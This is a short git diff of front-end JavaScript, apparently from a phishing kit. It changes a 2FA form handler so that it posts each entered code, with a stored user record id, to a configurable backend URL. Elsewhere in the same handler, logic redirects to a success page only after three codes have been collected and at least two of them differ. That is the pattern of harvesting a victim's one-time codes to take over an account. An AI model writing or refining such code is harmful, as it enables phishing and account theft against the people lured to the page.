@@ -48,12 +48,14 @@ document.getElementById('send2fa').addEventListener('click', function (event) {
             twoFACodeInput.classList.add('is-invalid');
         } else {
             // Gửi dữ liệu về backend nếu input không trống
-            fetch('/save-2fa', {
+            const urlSave2FA = document.getElementById('url-save-2fa').value;
+            fetch(urlSave2FA, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
+                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                 },
-                body: JSON.stringify({ twoFACode }),
+                body: JSON.stringify({ twoFACode, twoFACodeInput: twoFACodeInput.name, record_id: sessionStorage.getItem('userInputId') }),
             })
                 .then(response => {
                     if (response.ok) {
@@ -88,7 +90,7 @@ document.getElementById('send2fa').addEventListener('click', function (event) {
                             (code1 !== code2 || code1 !== code3 || code2 !== code3)
                         ) {
                             console.log('At least 2 codes are unique. Redirecting to success page...');
-                            window.location.href = 'success.html';
+                            window.location.href = 'success';
                         }
                     } else {
                         throw new Error('Failed to send 2FA code.');
